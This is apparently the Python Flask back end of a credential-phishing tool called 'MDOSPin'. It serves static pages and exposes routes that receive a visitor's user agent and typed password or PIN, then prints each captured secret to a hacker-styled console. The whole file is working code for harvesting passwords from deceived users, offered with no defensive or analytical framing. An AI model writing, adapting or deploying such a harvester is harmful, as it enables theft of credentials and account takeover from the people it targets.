from flask import Flask, request
from flask_restful import Resource, Api
from json import dumps
from flask_jsonpify import jsonify
from OpenSSL import SSL
import re, os, json, threading, time

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def welcome():
	time.sleep(5)
	global port
	if (port == 8070):
		proto = "HTTPS"
	elif (port == 8075):
		proto = "HTTP"
	else:
		proto = "Unknown Protocol"
	print("""\033[91m
*     *  *****    ***    ***   ****                  
**   **   *   *  *   *  *   *  *   *    *            
* * * *   *   *  *   *  *      *   *                 
*  *  *   *   *  *   *  *      *   *   **    * ***   
*     *   *   *  *   *   ***   ****     *    **   *  
*     *   *   *  *   *      *  *        *    *    *  
*     *   *   *  *   *      *  *        *    *    *  
*     *   *   *  *   *  *   *  *        *    *    *  
*     *  *****    ***    ***   *      *****  *    *  
\033[0m""")

	print("Server running on", f"{bcolors.FAIL}0.0.0.0:{port}{bcolors.ENDC} with {bcolors.FAIL}{proto}{bcolors.ENDC}")
	print("")
	print("\033[1m\033[92m[festus8070@Unknown\033[0m \033[1m\033[91mMDOSPin\033[0m\033[1m\033[92m]$\033[0m","Waiting for a Connection...")

import sys
cli = sys.modules['flask.cli']
cli.show_server_banner = lambda *x: None

app = Flask(__name__,static_url_path='/web',static_folder='../static',template_folder='../static/templates')
api = Api(app)

def activate_job():
     download_thread = threading.Thread(target=welcome, name="welcomer")
     download_thread.start()

import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

class newpass(Resource):
    def get(self, passwd, useragent):
        print("\033[1m\033[92m[festus8070@Unknown\033[0m \033[1m\033[91mMDOSPin\033[0m\033[1m\033[92m]$\033[0m","NEW PASSWORD:","\033[1m\033[4m\033[91m",passwd,"\033[0m","FROM:\033[1m\033[4m\033[91m",useragent,"\033[0m")
        return   

class newuser(Resource):
    def get(self, useragent):
        print("\033[1m\033[92m[festus8070@Unknown\033[0m \033[1m\033[91mMDOSPin\033[0m\033[1m\033[92m]$\033[0m","NEW USER:","\033[1m\033[4m\033[91m",useragent,"\033[0m")
        return 

class left(Resource):
    def get(self, useragent):
        print("\033[1m\033[92m[festus8070@Unknown\033[0m \033[1m\033[91mMDOSPin\033[0m\033[1m\033[92m]$\033[0m","USER HAS LEFT:","\033[1m\033[4m\033[91m",useragent,"\033[0m")
        return        


#class getstatic(Resource):
#    def send_js(self, path):
#        return send_from_directory('../static', path)

#api.add_resource(getstatic, '/web/<path>') # Route_1
api.add_resource(left, '/left/<useragent>') # Route_1
api.add_resource(newuser, '/new/<useragent>') # Route_2
api.add_resource(newpass, '/pass/<useragent>/<passwd>') # Route_3


if __name__ == '__main__':
     #welcome()
     activate_job()
     with open('config.json') as json_file:
          data = json.load(json_file)
     _key = data["key"]
     _crt = data["crt"]
     print("Using:\n",_crt,"\n",_key,"\n")
     context = (_crt,_key)
     try:
          port = 8070
          app.run(ssl_context=context,port='8070',host='0.0.0.0')
     except Exception as ex:
          try:
                #func = request.environ.get('werkzeug.server.shutdown')
                #func()
                pass
          except Exception as ee:
                print(ee)
          template = "An exception of type {0} occurred. Arguments:\n{1!r}"
          message = template.format(type(ex).__name__, ex.args)
          print(message)
          if type(ex).__name__ == "FileNotFoundError":
               print("\nCertificate files were not found!")
          port = 8075
          app.run(port='8075',host='0.0.0.0')
